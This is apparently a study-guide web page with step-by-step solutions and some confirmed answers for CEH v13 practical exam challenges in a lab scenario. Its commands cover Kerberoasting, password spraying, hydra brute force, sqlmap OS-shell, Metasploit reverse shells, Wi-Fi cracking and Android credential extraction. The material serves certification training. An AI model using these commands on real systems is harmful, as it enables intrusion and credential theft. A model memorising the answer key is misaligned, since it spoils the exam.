---
layout: default
title: All Challenges (1-20)
parent: Challenges
nav_order: 1
description: "All 20 CEH v13 practical challenges (CEH.CYBERSPHERE scenario) in sequence with full step-by-step solutions."
---

# All 20 Challenges — Full Solutions

CEH v13 Practical — **CEH.CYBERSPHERE** enterprise scenario. Challenges in exam sequence (1 → 20). Use <kbd>Ctrl</kbd>+<kbd>F</kbd> to jump to a challenge or tool.

**Target networks:** `10.22.99.0/24` · `172.16.32.0/24` · `10.100.50.0/24`
**Excluded hosts:** `.1` and `.2` on every subnet.
**Workstations:** EH-1 Parrot (`attacker` / `toor`) · EH-2 Windows 11 (`Admin` / `Pa$$w0rd`)
**Wordlists:** `~/Desktop/Wordlists/Usernames.txt` and `Passwords.txt` on EH-1.
**Pass mark:** 15 / 20 (150 pts) in 6 hours.

{: .warning }
> Answers below are from a live CEH.CYBERSPHERE pool. IPs, hostnames, and flag values **rotate per exam instance** — reproduce the method, don't memorize the string. Confirmed answers are marked ✅.

[← Challenge index](./){: .btn .btn-outline }

---

#### Challenge 1: NetBIOS Computer Name {#challenge-1}
**Domain:** 1 — Network Scanning | **Difficulty:** Easy | **Time:** 10-15 min
**Question:** Extensive scan of `10.22.99.101` to identify the NetBIOS computer name.
**Answer Format:** `AAAAAA` — ✅ **MSSSRV**

**Solution:**
1. NetBIOS/SMB discovery:
   ```bash
   nmap -sV -sC -p137,139,445 10.22.99.101
   nmap --script nbstat.nse -sU -p137 10.22.99.101
   ```
2. Or `nmap --script smb-os-discovery -p445 10.22.99.101`.
3. Read the **NetBIOS computer name** / `<computer name>` field → `MSSSRV`.
4. Quick alt: `nmblookup -A 10.22.99.101` → the `<20>` UNIQUE entry is the machine name.

---

#### Challenge 2: MSSQL Build Version on the Domain Controller {#challenge-2}
**Domain:** 1 — Network Scanning | **Difficulty:** Easy | **Time:** 10 min
**Question:** Identify the AD Domain Controller in the target network and get the full build version of its MSSQL instance.
**Answer Format:** `NN.NN.NNNN.NN` — ✅ **16.00.1000.00**

**Solution:**
1. Find the DC (ports 88/389/445/636 + 1433 for MSSQL):
   ```bash
   nmap -p88,389,445,1433 --open 10.22.99.0/24
   ```
2. Fingerprint the SQL Server on the DC:
   ```bash
   nmap -sV -p1433 --script ms-sql-info,ms-sql-ntlm-info <DC_IP>
   ```
3. Read the **version / build number** → `16.00.1000.00` (SQL Server 2022 RTM).

---

#### Challenge 3: SMTP Host — Subject Alternative Name {#challenge-3}
**Domain:** 1 — Network Scanning | **Difficulty:** Medium | **Time:** 15 min
**Question:** From `ipprotocols.txt` (EH-1 Downloads), find the machine running SMTP and its certificate Subject Alternative Name.
**Answer Format:** `AAA*aaaaaa` — ✅ **DNS:ubuntu**

**Solution:**
1. Scan every IP in the list for SMTP:
   ```bash
   nmap -iL ~/Downloads/ipprotocols.txt -p25,465,587 --open -sV
   ```
2. On the SMTP host, pull the TLS cert SAN:
   ```bash
   nmap --script ssl-cert -p25 <SMTP_HOST>
   # or
   openssl s_client -connect <SMTP_HOST>:25 -starttls smtp </dev/null 2>/dev/null | openssl x509 -noout -text | grep -A1 "Subject Alternative Name"
   ```
3. Read the SAN → `DNS:ubuntu`.

---

#### Challenge 4: PE Header — Loader Flags Description {#challenge-4}
**Domain:** 4 — Malware / Reverse Engineering | **Difficulty:** Medium | **Time:** 15-20 min
**Question:** A malicious exe disguised as an image sits in the Downloads folder of an RDP-enabled Windows 11 host in `10.22.99.0/24`. Find the description of the **Loader Flags** field in the PE header.
**Answer Format:** `Aaaaaaaa` — ✅ **Obsolete**

**Solution:**
1. Find the RDP host: `nmap -p3389 --open 10.22.99.0/24`, then `xfreerdp /u:Admin /p:'Pa$$w0rd' /v:<HOST> /cert:ignore`.
2. Locate the fake-image exe in `Downloads` (check real type: `file suspicious.jpg` → shows PE32).
3. Open in **PE-bear / CFF Explorer / Detect It Easy**, go to **Optional Header**.
4. Hover the **Loader Flags** field — its documented description is **Obsolete** (reserved, must be zero).

---

#### Challenge 5: Kerberoasting an SPN User {#challenge-5}
**Domain:** 2 — System Hacking (AD) | **Difficulty:** Medium | **Time:** 15-20 min
**Question:** Kerberoast an SPN user from the DC. Provide the **last four characters** of that account's password. Known creds: `Emily / T3chieT1g3r2024`.
**Answer Format:** `aaNN`

**Solution:**
1. Request service tickets for all SPN accounts:
   ```bash
   impacket-GetUserSPNs CEH.CYBERSPHERE.com/Emily:'T3chieT1g3r2024' -dc-ip <DC_IP> -request -outputfile kerb.hash
   ```
2. Crack the TGS-REP hash:
   ```bash
   hashcat -m 13100 kerb.hash ~/Desktop/Wordlists/Passwords.txt
   # or: john --wordlist=~/Desktop/Wordlists/Passwords.txt kerb.hash
   ```
3. Take the cracked password → **last 4 chars** = answer.

---

#### Challenge 6: Password Spray → WriteDacl (PowerView) {#challenge-6}
**Domain:** 2 — System Hacking (AD) | **Difficulty:** Medium | **Time:** 20 min
**Question:** Using known password `H3l3n@444`, spray to get RDP access. Then with PowerView, find the user account that **Carlos** can manage via **WriteDacl** rights.
**Answer Format:** `Aaaaaa`

**Solution:**
1. Password spray one password across the user list:
   ```bash
   crackmapexec smb 10.22.99.0/24 -u ~/Desktop/Wordlists/Usernames.txt -p 'H3l3n@444' --continue-on-success
   ```
   `[+]` = valid user. Note the host.
2. RDP in:
   ```bash
   xfreerdp /u:<valid_user> /p:'H3l3n@444' /v:<HOST> /cert:ignore +clipboard
   ```
3. PowerView — objects Carlos holds WriteDacl over:
   ```powershell
   Import-Module .\PowerView.ps1
   $carlos = Convert-NameToSid Carlos
   Get-DomainObjectAcl -ResolveGUIDs -Identity * | ? {
     $_.SecurityIdentifier -eq $carlos -and $_.ActiveDirectoryRights -match 'WriteDacl'
   } | % { ConvertFrom-SID $_.ObjectSID }
   ```
   (Old PowerView: `Get-ObjectAcl`.) The resolved object name = answer.

---

#### Challenge 7: AS-REP Roast → Enable SSH → flag.txt {#challenge-7}
**Domain:** 2 — System Hacking (AD) | **Difficulty:** Hard | **Time:** 20-25 min
**Question:** Client is AS-REP-roastable and already has a Meterpreter session on port **5555**. Crack the AS-REP hash, enable SSH, log in with the recovered creds, read `flag.txt`. Provide the **last six characters**.
**Answer Format:** `A**aNa`

**Solution:**
1. AS-REP roast (no auth needed for accounts with pre-auth disabled):
   ```bash
   impacket-GetNPUsers CEH.CYBERSPHERE.com/ -usersfile ~/Desktop/Wordlists/Usernames.txt -no-pass -dc-ip <DC_IP> -format hashcat -outputfile asrep.txt
   ```
2. Crack: `hashcat -m 18200 asrep.txt ~/Desktop/Wordlists/Passwords.txt`
3. In the Meterpreter session (`use exploit/multi/handler`, `set LPORT 5555`), enable OpenSSH:
   ```powershell
   Start-Service sshd
   Set-Service sshd -StartupType Automatic
   New-NetFirewallRule -Name sshd -DisplayName OpenSSH -Enabled True -Direction Inbound -Protocol TCP -Action Allow -LocalPort 22
   ```
   (If missing: `Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0`.)
4. `ssh <cracked_user>@<HOST>` → locate & read `flag.txt` → **last 6 chars** = answer.

---

#### Challenge 8: PCAP Credentials → Street Name {#challenge-8}
**Domain:** 6 — Traffic Analysis | **Difficulty:** Medium | **Time:** 15 min
**Question:** `Secretive.pcap` under the admin profile at `10.22.99.170`. Find the creds used to log in to `www.filmfocuszone.com`, then provide the user's **street name** from the Address field.
**Answer Format:** `NNN Aaa`

**Solution:**
1. Pull the pcap off the host: `smbclient //10.22.99.170/C$ -U Admin` (or RDP + copy).
2. Extract login creds from the HTTP POST:
   ```bash
   tshark -r Secretive.pcap -Y 'http.request.method=="POST"' -T fields -e http.file_data
   ```
   In Wireshark: filter `http.request.method == "POST"` → Follow HTTP Stream → read `username=`/`password=`.
3. Street may already be in the capture (registration/profile load):
   ```bash
   tshark -r Secretive.pcap -Y http -T fields -e http.file_data | grep -iE 'address|street'
   ```
   Otherwise log in to the site → **My Account** → read the Address field → `NNN Aaa`.

---

#### Challenge 9: Crack SSH for Alex → Decode QR → URL {#challenge-9}
**Domain:** 2 / 4 — System Hacking + Crypto | **Difficulty:** Medium | **Time:** 15-20 min
**Question:** Crack SSH creds for user **Alex** on an Ubuntu host, retrieve and decode a QR code to reveal the website URL it contains.
**Answer Format:** `aaaa*aaa`

**Solution:**
1. Find SSH host: `nmap -p22 --open 10.22.99.0/24`.
2. Crack Alex's password:
   ```bash
   hydra -l Alex -P ~/Desktop/Wordlists/Passwords.txt ssh://<HOST> -t4
   ```
3. `ssh Alex@<HOST>`, locate the QR image, pull it to EH-2 (`scp` / shared folder).
4. Decode with **QR Code Desktop Reader & Generator** (preinstalled on EH-2) → read the URL → `aaaa*aaa`.
   - CLI alt: `zbarimg qrcode.png`.

---

#### Challenge 10: DDoS PCAP — Attacker OS with Highest Burst Rate {#challenge-10}
**Domain:** 6 — Traffic Analysis | **Difficulty:** Hard | **Time:** 20-25 min
**Question:** From a DDoS `.pcap` in Boby's Downloads (Linux host, `10.22.99.0/24`), determine the OS of the botnet machine with the **highest burst rate**.
**Answer Format:** `Aaaaaa`

**Solution:**
1. Access Boby's host (SSH/creds), pull the pcap.
2. Find the top talker: Wireshark → **Statistics → Conversations → IPv4**, sort by packets/bytes/burst → highest-rate source IP.
   - CLI: `tshark -r ddos.pcap -q -z conv,ip`.
3. Fingerprint that IP's OS via TTL / options:
   ```bash
   tshark -r ddos.pcap -Y "ip.src==<TOP_IP>" -T fields -e ip.ttl | sort -u
   ```
   TTL 64 → **Linux**, 128 → **Windows**, 255 → network/Unix. Report the OS name → `Aaaaaa`.

---

#### Challenge 11: Honeypot Assessment → imhere.txt {#challenge-11}
**Domain:** 3 — Web / Exploitation | **Difficulty:** Medium | **Time:** 15-20 min
**Question:** Assess `172.16.32.210` (suspected honeypot). Find vulns, gain access, locate `imhere.txt`. Provide the **last five characters** of its content.
**Answer Format:** `ANaNa`

**Solution:**
1. Full scan: `nmap -sV -sC -p- 172.16.32.210`.
2. Enumerate exposed services (honeypots often mimic multiple daemons); target the genuinely exploitable one — check web dirs (`gobuster`), default creds, known CVEs.
3. Gain a shell, then hunt the file:
   ```bash
   find / -name imhere.txt 2>/dev/null
   cat <path>/imhere.txt
   ```
4. Take the **last 5 chars** → answer.

---

#### Challenge 12: Web Exploit → Decrypt VeraCrypt Image {#challenge-12}
**Domain:** 4 — Cryptography | **Difficulty:** Hard | **Time:** 25-30 min
**Question:** Exploit the web server, reach the upload directory holding a **VeraCrypt** image, decrypt it. Provide the **last four characters** of the extracted content.
**Answer Format:** `NA*N`

**Solution:**
1. Enumerate the web app, find the upload dir, retrieve the `.hc` / VeraCrypt container.
2. Crack the volume password:
   ```bash
   veracrypt2john volume.hc > vc.hash
   hashcat -m 13721 vc.hash ~/Desktop/Wordlists/Passwords.txt   # try -m 13721/13722/13723 by variant
   ```
3. Mount with the recovered password (VeraCrypt GUI or `veracrypt --mount volume.hc /mnt/vc`).
4. Read the decrypted file → **last 4 chars** = answer.

---

#### Challenge 13: Exploit CEH Website → Employee Details File {#challenge-13}
**Domain:** 3 — Web Hacking | **Difficulty:** Hard | **Time:** 25-30 min
**Question:** Exploit the CEH website at `172.16.32.252`, retrieve the employee-details file from the Downloads folder. Provide the **file name**.
**Answer Format:** `ANaaaaaaaa`

**Solution:**
1. Enumerate: `whatweb http://172.16.32.252`, `gobuster dir`, `nikto`.
2. Exploit the identified vuln (SQLi / file upload / RCE / known CVE) to get a shell or file read.
3. List the Downloads folder:
   ```bash
   dir C:\Users\*\Downloads      # Windows
   ls ~/Downloads                # Linux
   ```
4. Report the employee file's **name** → `ANaaaaaaaa`.

---

#### Challenge 14: SQLi → OS-Shell → Wrap.txt {#challenge-14}
**Domain:** 3 — Web Hacking | **Difficulty:** Hard | **Time:** 25-30 min
**Question:** SQL-inject `filmfocuszone.com`, obtain an **OS-Shell** on the hosting machine, read `C:\Windows\system32\Trigger\Wrap.txt`. Provide the **last five characters**. Note: an encoded cookie hash of the site is stored on EH-2.
**Answer Format:** `A****`

**Solution:**
1. Grab the encoded cookie from EH-2, decode it (Base64 → cookie string) for an authenticated session.
2. Drive sqlmap with the cookie into OS-shell (needs `--os-shell`, MSSQL stacked queries):
   ```bash
   sqlmap -u "http://filmfocuszone.com/<injectable>" --cookie="<decoded_cookie>" --batch --os-shell
   ```
3. In the OS-shell:
   ```
   type C:\Windows\system32\Trigger\Wrap.txt
   ```
4. Take the **last 5 chars** → answer.

---

#### Challenge 15: Crack Charley's Account Password {#challenge-15}
**Domain:** 3 / 4 — Web + Crypto | **Difficulty:** Medium | **Time:** 15 min
**Question:** On `www.smartshopperway.com`, crack user **Charley**'s account password.
**Answer Format:** `Aaaaaaaa`

**Solution:**
1. Locate the login form; brute the account with the supplied wordlist:
   ```bash
   hydra -l Charley -P ~/Desktop/Wordlists/Passwords.txt <HOST> http-post-form \
     "/login.php:username=^USER^&password=^PASS^:F=incorrect"
   ```
   (Adjust path/params/failure string to the real form.)
2. If you instead recover a stored hash, identify it (`hashid`) and `hashcat`/`john` it.
3. The cracked plaintext → answer.

---

#### Challenge 16: Android — Pico TTS Package Name {#challenge-16}
**Domain:** 5 — Mobile & IoT | **Difficulty:** Medium | **Time:** 15 min
**Question:** On a compromised Android device, enumerate installed apps and find the **package name** of the Pico TTS Service.
**Answer Format:** `aaa*aaaa*aaaa`

**Solution:**
1. Connect: `adb connect <ANDROID_IP>:5555` (or USB), verify `adb devices`.
2. List packages and filter:
   ```bash
   adb shell pm list packages | grep -i pico
   # or search by TTS
   adb shell pm list packages | grep -i tts
   ```
3. Pico TTS package → **`com.svox.pico`** (format `aaa.aaaa.aaaa`).

---

#### Challenge 17: Crack Wi-Fi from wifimap.cap {#challenge-17}
**Domain:** 7 — Wireless | **Difficulty:** Medium | **Time:** 15-20 min
**Question:** `wifimap.cap` (airodump-ng capture) is in EH-1 `Videos`. Crack the Wi-Fi password; provide the **first four characters**.
**Answer Format:** `aaaa`

**Solution:**
1. Identify the BSSID with a captured handshake:
   ```bash
   aircrack-ng ~/Videos/wifimap.cap
   ```
2. Crack against the wordlist:
   ```bash
   aircrack-ng -w ~/Desktop/Wordlists/Passwords.txt -b <BSSID> ~/Videos/wifimap.cap
   ```
3. `KEY FOUND! [ <password> ]` → take the **first 4 chars** = answer.

---

#### Challenge 18: Android — Decrypt BC_Enc.txt (Base64 key) {#challenge-18}
**Domain:** 5 / 4 — Mobile + Crypto | **Difficulty:** Medium | **Time:** 15 min
**Question:** Encrypted `BC_Enc.txt` is on an Android device; the decryption password is in EH-1 `Documents/B64.txt` (Base64). Decrypt and provide the **last 6 characters** of the plaintext.
**Answer Format:** `A*aAaa`

**Solution:**
1. Decode the key: `base64 -d ~/Documents/B64.txt` → decryption password.
2. Pull `BC_Enc.txt` off the device: `adb pull /sdcard/.../BC_Enc.txt ./`.
3. Decrypt to the format the file implies (BCTextEncoder / OpenSSL / ccrypt):
   ```bash
   openssl enc -d -aes-256-cbc -in BC_Enc.txt -out dec.txt -k '<decoded_password>'
   # or: ccrypt -d -K '<password>' BC_Enc.txt
   ```
   BCTextEncoder `.txt` blobs open in the BCTextEncoder GUI with the decoded passphrase.
4. Read `dec.txt` → **last 6 chars** = answer.

---

#### Challenge 19: Docker Image with CVE-2019-13012 — Size {#challenge-19}
**Domain:** 5 — Container / Vuln Mgmt | **Difficulty:** Hard | **Time:** 20 min
**Question:** On EH-1, find the Docker image containing **CVE-2019-13012** and report its size in MB.
**Answer Format:** `NNN`

**Solution:**
1. List local images with sizes:
   ```bash
   docker images
   ```
2. Scan each for the CVE (CVE-2019-13012 = GLib `GKeyFile`/file-permission flaw):
   ```bash
   trivy image <image:tag> | grep CVE-2019-13012
   # or loop: for i in $(docker images --format '{{.Repository}}:{{.Tag}}'); do trivy image -q "$i" | grep -q CVE-2019-13012 && echo "MATCH $i"; done
   ```
3. For the matching image, read the **SIZE** column from `docker images` → `NNN` MB.

---

#### Challenge 20: Stego Password → Decrypt Doc → Latitude {#challenge-20}
**Domain:** 4 / 6 — Crypto + Forensics | **Difficulty:** Hard | **Time:** 25-30 min
**Question:** A hacker's info is encrypted on a target Ubuntu host. The decryption password hides in a **steganographic image** under user **Jack** on a Windows host (`10.22.99.0/24`). Decrypt the doc and provide the hacker's **latitude**.
**Answer Format:** `NN*NNNN`

**Solution:**
1. Access Jack's Windows host, grab the stego image; extract the hidden password:
   ```bash
   steghide extract -sf image.jpg -p ''        # try blank / obvious passphrases
   stegseek image.jpg ~/Desktop/Wordlists/Passwords.txt   # if passphrase-protected
   ```
2. On the Ubuntu host, decrypt the document with that password (GPG / OpenSSL / zip per file type):
   ```bash
   gpg --batch --passphrase '<stego_pw>' -o doc.out -d document.gpg
   # or openssl enc -d ... / unzip -P
   ```
3. Read the coordinates in the decrypted doc → report the **latitude** → `NN.NNNN`.

---
---

# Practice Pool — Legacy Challenges (21–40)

Earlier CEH v13 practical variants. IPs use `192.168.x` placeholders — swap for your live lab. Same skills, different flag rotation. Train these to build muscle memory, then run the CEH.CYBERSPHERE set above cold.

---

#### Challenge 21: Find Domain Controller DNS Name {#challenge-21}
**Domain:** 1 — Network Scanning | **Difficulty:** Easy | **Time:** 10-15 min
**Question:** Conduct a comprehensive scan of the network to identify the DNS computer name of the Domain Controller.
**Answer Format:** AaaaaAaaa*AAAAAA*aaa (e.g., DOMAINCONTROLLER01)

**Solution:**
1. `nmap -A -T4 192.168.1.0/24`
2. Look for domain controller (ports 389/445/3389)
3. `nmap --script smb-os-discovery.nse -p445 [DC_IP]`
4. Extract the Computer name field

---

#### Challenge 22: Find IMAP Mercury Service Version {#challenge-22}
**Domain:** 1 — Network Scanning | **Difficulty:** Easy | **Time:** 10 min
**Question:** Identify the version of the IMAP Mercury service.
**Answer Format:** N.NN (e.g., 4.62)

**Solution:**
1. `nmap -A -T4 -p- 192.168.1.0/24`
2. Find port 143 (IMAP)
3. `nmap -sV -p 143 [HOST]`
4. Extract the version number

---

#### Challenge 23: SQL Injection — Extract Database {#challenge-23}
**Domain:** 3 — Web Hacking | **Difficulty:** Medium | **Time:** 15-20 min
**Question:** Use SQL injection to extract data from the victim database.
**Answer Format:** NaaAaa*aaa*aaaaa

**Solution:**
1. `sqlmap -u "http://192.168.1.5/page.php?id=1" -v`
2. `sqlmap -u "http://192.168.1.5/page.php?id=1" --dbs`
3. `sqlmap -u "http://192.168.1.5/page.php?id=1" -D dbname --tables`
4. `sqlmap -u "http://192.168.1.5/page.php?id=1" -D dbname -T users --dump`
5. Extract the answer from output

---

#### Challenge 24: Android Steganography {#challenge-24}
**Domain:** 5 — Mobile & IoT | **Difficulty:** Medium | **Time:** 15-20 min
**Question:** Extract the hidden data from IMG_20240621_143000.jpg on an Android device.
**Answer Format:** Variable (depends on hidden content)

**Solution:**
1. `adb connect 192.168.1.100:5555`
2. `adb shell ls /sdcard/DCIM/Camera/`
3. `adb pull /sdcard/DCIM/Camera/IMG_20240621_143000.jpg ./`
4. `steghide extract -sf IMG_20240621_143000.jpg -p ""`
5. `cat secret.txt`

---

#### Challenge 25: Crack RDP Credentials {#challenge-25}
**Domain:** 2 — System Hacking | **Difficulty:** Medium | **Time:** 15-20 min
**Question:** Crack the Windows RDP password for user "Admin".
**Answer Format:** AaaAaa*aaaa

**Solution:**
1. `nmap -p 3389 192.168.1.0/24` (find RDP)
2. `hydra -l Admin -P rockyou.txt rdp://[HOST]:3389 -v`
3. Wait for the successful login message
4. Extract the password

---

#### Challenge 26: Find Encrypted Password in Registry {#challenge-26}
**Domain:** 2 — System Hacking | **Difficulty:** Medium | **Time:** 15 min
**Question:** Connect via RDP with cracked credentials, find the password stored in the registry.
**Answer Format:** AaaaaaAaa*AAA

**Solution:**
1. `xfreerdp /u:Admin /p:PASSWORD /v:192.168.1.50`
2. Open Command Prompt
3. `reg query HKLM\Software\Microsoft\Windows /s | findstr /i password`
4. Extract the found password

---

#### Challenge 27: Advanced ADB Workflows {#challenge-27}
**Domain:** 5 — Mobile & IoT | **Difficulty:** Medium | **Time:** 20 min
**Question:** Find the database with login credentials on an Android device.
**Answer Format:** Variable (credentials from database)

**Solution:**
1. `adb root`
2. `adb shell ls /data/data/ | grep -i app_name`
3. `adb pull /data/data/com.example.banking/databases/users.db ./`
4. `sqlite3 users.db`
5. `.tables`
6. `SELECT * FROM users;`

---

#### Challenge 28: Hash Cracking {#challenge-28}
**Domain:** 4 — Cryptography | **Difficulty:** Easy | **Time:** 10 min
**Question:** Crack the MD5 hash to find the password.
**Answer Format:** AaaAaa*Aaaa

**Solution:**
1. `hashid hash_value`
2. `hashcat -m 0 -a 0 hashfile rockyou.txt`
3. Wait for the match
4. Extract the password

---

#### Challenge 29: PE File Version Extraction {#challenge-29}
**Domain:** 4 — Cryptography | **Difficulty:** Medium | **Time:** 15 min
**Question:** Find the File Version number from Ghostware.exe.
**Answer Format:** N.N.N.N (e.g., 2.3.4.5)

**Solution:**
1. Launch DIE (Detect It Easy)
2. File → Open → Ghostware.exe
3. Click "File Info" in the right pane
4. Look for the "Version" / "FileVersion" field
5. Extract the version number

---

#### Challenge 30: RAT Detection in PCAP {#challenge-30}
**Domain:** 6 — Traffic Analysis | **Difficulty:** Hard | **Time:** 20-25 min
**Question:** Analyze traffic to identify RAT activity and extract attacker details.
**Answer Format:** Variable (IP, port, commands)

**Solution:**
1. Open the PCAP in Wireshark
2. Look for unusual outbound connections
3. Filter: `ip.src == 192.168.1.50 && tcp.dstport != 80,443,53`
4. Right-click → Follow TCP Stream
5. Identify attacker IP, port, and commands

---

#### Challenge 31: Steganography Extraction {#challenge-31}
**Domain:** 4 — Cryptography | **Difficulty:** Medium | **Time:** 10-15 min
**Question:** Extract hidden data from an image file.
**Answer Format:** AaaAaa*Aaaa

**Solution:**
1. `steghide info image.jpg`
2. `steghide extract -sf image.jpg -p ""`
3. `cat secret.txt`

---

#### Challenge 32: DDoS Attack — Identify Attacker {#challenge-32}
**Domain:** 6 — Traffic Analysis | **Difficulty:** Medium | **Time:** 15 min
**Question:** Analyze traffic targeting 172.22.10.10, identify the Windows attacker IP and OS.
**Answer Format:** NN.NN.NN.NN

**Solution:**
1. Open the PCAP in Wireshark
2. Filter: `ip.dst == 172.22.10.10`
3. Statistics → Endpoints
4. Find the IP with the highest packet count
5. Check TTL values (128 = Windows)
6. Extract the attacker IP

---

#### Challenge 33: Metasploit Exploitation — Gain Shell {#challenge-33}
**Domain:** 2 — System Hacking | **Difficulty:** Hard | **Time:** 25-30 min
**Question:** Exploit the vulnerable service on the target host and retrieve the flag from the compromised user's Desktop.
**Answer Format:** Variable (flag string, e.g., FLAG{...})

**Solution:**
1. Identify the service: `nmap -sV -p- [TARGET]`
2. Launch Metasploit: `msfconsole -q`
3. Search the matching module: `search [service name]`
4. `use exploit/[matched/module/path]`
5. `set RHOSTS [TARGET]` and `set LHOST [YOUR_IP]`
6. (If needed) `set PAYLOAD windows/meterpreter/reverse_tcp`
7. `exploit`
8. In the session: `shell` → `type C:\Users\<user>\Desktop\flag.txt` (or `cat` on Linux targets)

---

#### Challenge 34: WordPress Enumeration with WPScan {#challenge-34}
**Domain:** 3 — Web Hacking | **Difficulty:** Medium | **Time:** 15-20 min
**Question:** Enumerate the target WordPress site and identify the version of the vulnerable plugin.
**Answer Format:** N.N.N (e.g., 1.5.2)

**Solution:**
1. Confirm WordPress: `whatweb http://192.168.1.50`
2. Enumerate plugins + users: `wpscan --url http://192.168.1.50 --enumerate vp,u`
3. (With API token for CVE data) `wpscan --url http://192.168.1.50 --enumerate vp --api-token [TOKEN]`
4. Locate the flagged plugin and read its **Version** line
5. Extract the version number

---

#### Challenge 35: Crack a Password-Protected Archive {#challenge-35}
**Domain:** 4 — Cryptography | **Difficulty:** Medium | **Time:** 15 min
**Question:** Crack the password-protected ZIP archive and read the secret file inside.
**Answer Format:** Variable (contents of the secret file)

**Solution:**
1. Extract the hash: `zip2john secret.zip > zip.hash`
2. Crack it: `john --wordlist=/usr/share/wordlists/rockyou.txt zip.hash`
3. Show the password: `john --show zip.hash`
4. Unzip with it: `unzip -P [password] secret.zip`
5. `cat secret.txt` to read the answer

---

#### Challenge 36: Path Traversal / Directory Enumeration {#challenge-36}
**Domain:** 3 — Web Hacking | **Difficulty:** Medium | **Time:** 15 min
**Question:** Find the hidden admin directory on the web server.
**Answer Format:** /admin*area

**Solution:**
1. `nikto -h http://192.168.1.50`
2. Or: `gobuster dir -u http://192.168.1.50 -w /usr/share/wordlists/dirb/common.txt`
3. Look for 200/301 responses (found directories)
4. Test found directories in a browser
5. Identify the admin-related directory

---

#### Challenge 37: IoT Firmware Analysis {#challenge-37}
**Domain:** 5 — Mobile & IoT | **Difficulty:** Hard | **Time:** 20-25 min
**Question:** Extract the IoT device firmware image and find the hardcoded admin credentials.
**Answer Format:** Variable (user:password)

**Solution:**
1. Inspect the image: `binwalk firmware.bin`
2. Extract the filesystem: `binwalk -e firmware.bin`
3. Search for credentials in the extracted root:
   - `grep -riE "password|passwd|admin" _firmware.bin.extracted/`
   - `strings firmware.bin | grep -iE "admin|root|pass"`
4. Inspect `/etc/passwd` and `/etc/shadow` in the extracted filesystem
5. Extract the hardcoded user:password pair

---

#### Challenge 38: IoT Protocol — MQTT Topic Extraction {#challenge-38}
**Domain:** 6 — Traffic Analysis | **Difficulty:** Medium | **Time:** 15 min
**Question:** Find the IoT Publish message in traffic and extract the topic name.
**Answer Format:** Aaaa*Aaaa (e.g., home/temperature)

**Solution:**
1. Open the PCAP in Wireshark
2. Filter: `mqtt.msgtype == 3`
3. Look for PUBLISH packets
4. Expand the MQTT section in packet details
5. Find the "Topic Name" field and extract it

---

#### Challenge 39: Advanced Traffic Analysis — Data Exfiltration {#challenge-39}
**Domain:** 6 — Traffic Analysis | **Difficulty:** Hard | **Time:** 20-25 min
**Question:** Identify data exfiltration in the traffic — extract the stolen files/credentials.
**Answer Format:** Variable

**Solution:**
1. Open the PCAP in Wireshark
2. Look for large outbound transfers
3. Filter: `ip.src == [internal_ip] && ip.dst != [internal_network]`
4. Identify the protocol (FTP, SMB, HTTP)
5. Follow TCP Stream for the complete data
6. Extract file contents or credentials

---

#### Challenge 40: WiFi Cracking — Extract Last 4 Characters {#challenge-40}
**Domain:** 7 — Wireless | **Difficulty:** Easy | **Time:** 10-15 min
**Question:** Crack the WiFi password from Credmapwifi.cap and provide the last 4 characters.
**Answer Format:** aaaN (e.g., pass1)

**Solution:**
1. `aircrack-ng Credmapwifi.cap`
2. Find the BSSID: `AA:BB:CC:DD:EE:FF`
3. `aircrack-ng -w /usr/share/wordlists/rockyou.txt -b AA:BB:CC:DD:EE:FF Credmapwifi.cap`
4. Read: `KEY FOUND! [ PasswordHere ]`
5. Extract the last 4 characters

---

[← Back to challenge index](./){: .btn }
